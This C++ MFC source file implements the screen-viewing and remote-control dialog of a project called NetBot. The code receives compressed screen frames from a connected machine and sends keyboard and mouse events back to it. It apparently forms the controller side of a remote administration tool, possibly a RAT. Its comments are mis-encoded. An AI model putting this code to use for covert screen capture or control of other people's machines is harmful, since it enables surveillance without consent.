// ScreenDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "ScreenDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CScreenDlg dialog


CScreenDlg::CScreenDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CScreenDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CScreenDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_ConnSocket = INVALID_SOCKET;
	m_HelpSocket = INVALID_SOCKET;
	m_bStop = FALSE;
	m_bCtrl = FALSE;
	m_Color = 8;
}

void CScreenDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CScreenDlg)
	DDX_Control(pDX, IDC_CHECK_CTRL, m_ctl);
	DDX_Control(pDX, IDC_PROGRESS_SCREEN, m_Progress);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CScreenDlg, CDialog)
	//{{AFX_MSG_MAP(CScreenDlg)
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_BTN_START, OnBtnStart)
	ON_BN_CLICKED(IDC_CHECK_CTRL, OnCheckCtrl)
	ON_BN_CLICKED(IDC_BTN_SAVEBMP, OnBtnSaveBmp)
	//}}AFX_MSG_MAP
	ON_COMMAND_RANGE(IDC_RADIO_COLOR1,IDC_RADIO_COLOR4,OnSelectScreenBytes) 
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CScreenDlg message handlers
void CScreenDlg::OnSelectScreenBytes(UINT nID)
{
	switch(nID)
	{
	case IDC_RADIO_COLOR1:
		m_Color = 8;
		break;
	case IDC_RADIO_COLOR2:
		m_Color = 16;
		break;
	case IDC_RADIO_COLOR3:
		m_Color = 24;
		break;
	case IDC_RADIO_COLOR4:
		m_Color = 32;
		break;
	default:
		m_Color = 8;
		break;
	}
}

void CScreenDlg::SetConnSocket(SOCKET miansocket,SOCKET helpsocket)
{
	m_ConnSocket = miansocket;
	m_HelpSocket = helpsocket;

	sockaddr_in addr;
	int cb = sizeof(addr);
	int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
	CString OnlineIP;
	OnlineIP.Format("%s:%d",inet_ntoa(addr.sin_addr),ntohs(addr.sin_port));//ntohs������u_longתint

	SetWindowText("[��Ļ���] "+OnlineIP);
}

BOOL CScreenDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	// Set the small icon for this dialog
	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_SCREEN), FALSE);
	CenterWindow();
	// TODO: Add extra initialization here
	m_PicBox.Create(NULL, NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_HSCROLL | WS_VSCROLL, CRect(0, 0, 1, 1), this, 0);
	CRect rc;
	GetClientRect(&rc);
	rc.top += 35;
	m_PicBox.MoveWindow(&rc);

	((CButton*)GetDlgItem(IDC_RADIO_COLOR1))->SetCheck(1);
	GetDlgItem(IDC_BTN_SAVEBMP)->EnableWindow(FALSE);

	m_ctl.SetCheck(1);
	m_bCtrl = TRUE;

	return TRUE;
}

void CScreenDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	CDialog::PostNcDestroy();
	delete this;
}

void CScreenDlg::OnCancel()
{	
	m_bStop = TRUE;
	ScreenStop();
	
	//��ģʽ�Ի�����Ҫ�������ٶԻ���
	DestroyWindow();
	//CDialog::OnCancel();
}

void CScreenDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);	
	// TODO: Add your message handler code here
	if( m_PicBox.m_hWnd == NULL)
		return;

	CRect rc;
	GetClientRect(&rc);
	rc.top += 35;
	m_PicBox.MoveWindow(&rc);	
}

DWORD CScreenDlg::RecvScreen() 
{
	//���÷��ͻ�����,��������Ļ����
	int rcvbuf = 65536; //64KB
	int rcvbufsize=sizeof(int);
	setsockopt(m_ConnSocket,SOL_SOCKET,SO_SNDBUF,(char*)&rcvbuf,rcvbufsize);
	int bNodelay = 1;
	setsockopt(m_ConnSocket,IPPROTO_TCP,TCP_NODELAY,(char*)&bNodelay,sizeof(bNodelay));//��������ʱ�㷨   

	MsgHead msgHead;
	msgHead.dwCmd = SOCKET_SCREEN;
	msgHead.dwSize = 0;
	msgHead.dwExtend1 = m_Color;
		
	if( !SendMsg(m_ConnSocket, NULL, &msgHead) || //����λͼ��ɫλ��
		!RecvMsg(m_ConnSocket, NULL, &msgHead))   //����bmp��Ϣ
	{
		//���ݴ���ʧ��
		SetWindowText("Զ��ͨ��ʧ��");
		closesocket(m_ConnSocket);
		return 0;//send socket type error	
	}
	else
	{
		//������Ļ��Ϣ
		m_ScreenXor.SetBmpSize( msgHead.dwExtend1 );
		m_ScreenXor.SetInfoSize( msgHead.dwExtend2 );
	}

	BYTE* pCompress=new BYTE [msgHead.dwExtend1];
	
	while(!m_bStop)
	{
		//�Ƚ�����Ϣͷ
		if(recv( m_ConnSocket,(char*)&msgHead,sizeof(MsgHead),0) >0)
		{
			if(msgHead.dwCmd <0 )
				return 0;

			//����֡����ʵ�ʳ��Ƚ��ܸ�֡����
			int iRecvLen = 0;
			int iRecved;
			m_Progress.SetRange(0, (short)msgHead.dwSize);//������
			while (iRecvLen < (int)msgHead.dwSize)
			{
				if( (msgHead.dwSize - iRecvLen) >=  BUFFER_MAXLEN)
				{
					iRecved = recv(m_ConnSocket,(char*)pCompress + iRecvLen, BUFFER_MAXLEN,0);
					if( iRecved == SOCKET_ERROR)
					{
						closesocket(m_ConnSocket);
						break;
					}
				}
				else
				{
					iRecved = recv(m_ConnSocket,(char*)pCompress + iRecvLen, msgHead.dwSize - iRecvLen,0);
					if( iRecved == SOCKET_ERROR)
					{
						closesocket(m_ConnSocket);
						break;
					}
				}
				iRecvLen += iRecved;
				m_Progress.SetPos(iRecvLen);
			}
			/////////////////////////////////////////////
			DWORD lenthUncompress =msgHead.dwExtend1;
			if(msgHead.dwCmd == 0)
			{
				uncompress(m_ScreenXor.GetBmpData(), &lenthUncompress, pCompress, msgHead.dwSize);
			}
			else
			{
				uncompress(m_ScreenXor.GetBmpSaveData(), &lenthUncompress, pCompress, msgHead.dwSize);
				m_ScreenXor.XorFrame();			
			}

			//��ʾͼ��
			m_PicBox.SetBitmap(m_ScreenXor.GetBitmapFromData());
			::Sleep(15);
		}
	}

	if(pCompress)
		delete[] pCompress;

	return 1;
}

DWORD CScreenDlg::RecvScreenThread(void* pThis)
{
	return ((CScreenDlg *)pThis)->RecvScreen();
}

void CScreenDlg::ScreenStop()
{	
	//��Ϊ��Ļ�õĵ�����socket����������Ҫ�ر�
	shutdown(m_ConnSocket,0x02);
	closesocket(m_ConnSocket);
	//�����߳�
	DWORD dwExitCode;
	if(hRecvScreenThread != NULL)
	{
		WaitForSingleObject(hRecvScreenThread,200);
		if(GetExitCodeThread(hRecvScreenThread,&dwExitCode))
		{
			if(dwExitCode==STILL_ACTIVE)
			{
				TerminateThread(hRecvScreenThread,dwExitCode);
			}
		}
		hRecvScreenThread = NULL;
	}
}

void CScreenDlg::OnBtnStart() 
{
	//���������߳�
	hRecvScreenThread = CreateThread(NULL,
								  0,
								  (LPTHREAD_START_ROUTINE)RecvScreenThread,
								  this,
								  0,
								  NULL);
	if (hRecvScreenThread != NULL)
	{
		m_PicBox.SetTipText("���Ժ����ڽ��յ�һ֡���ݡ���");
		GetDlgItem(IDC_BTN_START)->EnableWindow(FALSE);
		GetDlgItem(IDC_BTN_SAVEBMP)->EnableWindow(TRUE);
	}
}

void CScreenDlg::OnCheckCtrl() 
{
	// TODO: Add your control notification handler code here
	CButton* pBtn = (CButton*)GetDlgItem(IDC_CHECK_CTRL);
	if( pBtn->GetCheck()==0)
	{
		m_bCtrl = FALSE;
	}
	else
	{
		m_bCtrl = TRUE;
	}	
}

int iTimeCount = 0;
BOOL CScreenDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if(pMsg->message == WM_KEYDOWN && m_bCtrl)
	{
		int nVirtKey = pMsg->wParam;

		MsgHead msgHead;
		msgHead.dwCmd = CMD_KEYDOWN;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = nVirtKey;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->message == WM_KEYUP && m_bCtrl)
	{
		int nVirtKey = pMsg->wParam;

		MsgHead msgHead;
		msgHead.dwCmd = CMD_KEYUP;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = nVirtKey;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_MOUSEMOVE && m_bCtrl)
	{

		SCROLLINFO hStructure, vStructure;
		m_PicBox.GetScrollInfo(SB_HORZ, &hStructure);
		m_PicBox.GetScrollInfo(SB_VERT, &vStructure);
		CRect rc;
		m_PicBox.GetClientRect(&rc);
		int nXPos = hStructure.nPos;
		int nYPos = vStructure.nPos;
		if( nXPos + rc.Width() > hStructure.nMax)
			nXPos =  hStructure.nMax - rc.Width();
		if (nYPos + rc.Height() >  vStructure.nMax)
			nYPos = vStructure.nMax - rc.Height();
		int dwX = nXPos + LOWORD(pMsg->lParam);
		int dwY =  nYPos + HIWORD(pMsg->lParam);
		if( rc.Width() >= hStructure.nMax)
			dwX = LOWORD(pMsg->lParam);
		if( rc.Height() >= vStructure.nMax)
			dwY = HIWORD(pMsg->lParam);

//		POINT pt;
//		pt.x = dwX;
//		pt.y = dwY;
		//����һЩ�������
		iTimeCount++;
		if (iTimeCount %2 ==0)
			return TRUE;

		MsgHead msgHead;
		msgHead.dwCmd = CMD_MOUSEMOVE;
		msgHead.dwSize = 0;
		msgHead.dwExtend1 = dwX;
		msgHead.dwExtend2 = dwY;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_LBUTTONDOWN && m_bCtrl)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LBUTTONDOWN;
		msgHead.dwSize = 0;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_LBUTTONUP && m_bCtrl)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LBUTTONUP;
		msgHead.dwSize = 0;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_LBUTTONDBLCLK && m_bCtrl)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_LBUTTONDBLCLK;
		msgHead.dwSize = 0;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_RBUTTONDOWN && m_bCtrl)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RBUTTONDOWN;
		msgHead.dwSize = 0;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_RBUTTONUP && m_bCtrl)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RBUTTONUP;
		msgHead.dwSize = 0;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}
	if(pMsg->hwnd == m_PicBox.GetSafeHwnd() && pMsg->message == WM_RBUTTONDBLCLK && m_bCtrl)
	{
		MsgHead msgHead;
		msgHead.dwCmd = CMD_RBUTTONDBLCLK;
		msgHead.dwSize = 0;

		SendMsg(m_HelpSocket,NULL,&msgHead);

		return TRUE;
	}	

	return CDialog::PreTranslateMessage(pMsg);
}

void CScreenDlg::OnBtnSaveBmp() 
{
	// TODO: Add your control notification handler code here
	CString FileSavePath;

	CFileDialog saveDlg(FALSE, ".bmp", "screen",OFN_HIDEREADONLY| OFN_OVERWRITEPROMPT,"BMP Files(*.bmp)|*.bmp");
	if ( saveDlg.DoModal() == IDOK )
		FileSavePath = saveDlg.GetPathName();	
	else
		return;	

	m_PicBox.SaveBmp(FileSavePath);	
}
